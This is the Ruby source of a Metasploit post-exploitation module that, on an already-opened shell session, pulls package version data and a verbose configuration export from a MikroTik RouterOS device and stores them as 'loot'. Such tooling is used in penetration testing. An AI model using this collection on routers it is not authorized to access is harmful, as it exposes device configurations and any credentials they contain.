##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Mikrotik

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Mikrotik Gather Device General Information',
        'Description' => %q{
          This module collects Mikrotik device information and configuration.
          This module has been tested against RouterOS 6.45.9.
        },
        'License' => MSF_LICENSE,
        'Author' => ['h00die'],
        'Platform' => ['mikrotik'],
        'SessionTypes' => ['shell']
      )
    )
  end

  def run
    # Get device prompt
    prompt = session.shell_command("/\n")

    # https://wiki.mikrotik.com/wiki/Manual:Console#Safe_Mode
    if prompt.include?('<SAFE>') # safe mode from ctr+x
      vprint_status('In safe mode')
    end

    # Get version info
    print_status('Getting version information')
    version_out = session.shell_command("/system package print without-paging\n")

    ver_loc = store_loot('mikrotik.version',
                         'text/plain',
                         session,
                         version_out.strip,
                         'version.txt',
                         'Mikrotik Version')

    # Print the version of VERBOSE set to true.
    vprint_good(version_out)
    vprint_good("Version information stored in to loot #{ver_loc}")

    # run additional information gathering
    enum_configs
  end

  # run commands found in exec mode under privilege 1
  def enum_configs
    host = session.session_host
    port = session.session_port
    exec_commands = [
      {
        'cmd' => '/export verbose',
        'fn' => 'get_config',
        'desc' => 'Get Device Config on Mikrotik Device'
      },
    ]
    exec_commands.each do |ec|
      command = ec['cmd']
      cmd_out = session.shell_command(command).gsub(/#{command}/, '')
      print_status("Gathering info from #{command}")
      # detect if we're in pagination and get as much data as possible
      if ec['fn'] == 'get_config'
        mikrotik_routeros_config_eater(host, port, cmd_out.strip)
      else
        cmd_loc = store_loot("mikrotik.#{ec['fn']}",
                             'text/plain',
                             session,
                             cmd_out.strip,
                             "#{ec['fn']}.txt",
                             ec['desc'])
        vprint_good("Saving to #{cmd_loc}")
      end
    end
  end
end
